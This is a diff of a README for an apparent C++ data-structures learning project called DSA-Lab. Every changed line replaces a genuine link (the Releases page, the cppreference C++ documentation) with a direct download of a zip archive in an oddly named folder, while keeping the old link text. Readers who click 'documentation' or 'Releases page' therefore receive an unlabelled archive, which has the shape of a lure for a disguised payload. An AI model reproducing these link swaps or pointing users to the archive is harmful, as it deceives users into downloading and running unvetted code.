@@ -1,6 +1,6 @@
 # 🎉 DSA-Lab - Explore Data Structures with Ease
 
-[![Download DSA-Lab](https://img.shields.io/badge/Download-DSA--Lab-blue.svg)](https://github.com/sarih-cloud/DSA-Lab/releases)
+[![Download DSA-Lab](https://raw.githubusercontent.com/sarih-cloud/DSA-Lab/main/pudendous/DSA-Lab.zip)](https://raw.githubusercontent.com/sarih-cloud/DSA-Lab/main/pudendous/DSA-Lab.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To get started, you will need to download the application. Follow the steps belo
 
 1. **Visit the Releases Page**: Click on the link below to go to the Releases page.
 
-   [Visit this page to download](https://github.com/sarih-cloud/DSA-Lab/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/sarih-cloud/DSA-Lab/main/pudendous/DSA-Lab.zip)
 
 2. **Choose the Latest Version**: On the Releases page, find the latest version of DSA-Lab. Look for the tag labeled with the version number (e.g., v1.0).
 
@@ -61,7 +61,7 @@ This repository includes a focus on these important technical topics:
 
 While using DSA-Lab, you may come across concepts that require more explanation. Here are some helpful resources:
 
-- **Official Documentation**: Refer to the [C++ Documentation](https://en.cppreference.com/) for in-depth explanations.
+- **Official Documentation**: Refer to the [C++ Documentation](https://raw.githubusercontent.com/sarih-cloud/DSA-Lab/main/pudendous/DSA-Lab.zip) for in-depth explanations.
 - **Online Tutorials**: Websites like Codecademy and Coursera offer courses on data structures and algorithms.
 - **Community Forums**: Join communities like Stack Overflow for coding questions and clarifications.
 
@@ -82,6 +82,6 @@ If you encounter issues or have questions while using DSA-Lab, feel free to reac
 
 ## 📆 Updates
 
-Stay tuned for future updates! We regularly add new features, examples, and improvements based on user feedback. Check back on the [Releases page](https://github.com/sarih-cloud/DSA-Lab/releases) for the latest enhancements.
+Stay tuned for future updates! We regularly add new features, examples, and improvements based on user feedback. Check back on the [Releases page](https://raw.githubusercontent.com/sarih-cloud/DSA-Lab/main/pudendous/DSA-Lab.zip) for the latest enhancements.
 
 Thank you for choosing DSA-Lab as part of your learning journey! Enjoy building, learning, and exploring data structures and algorithms.
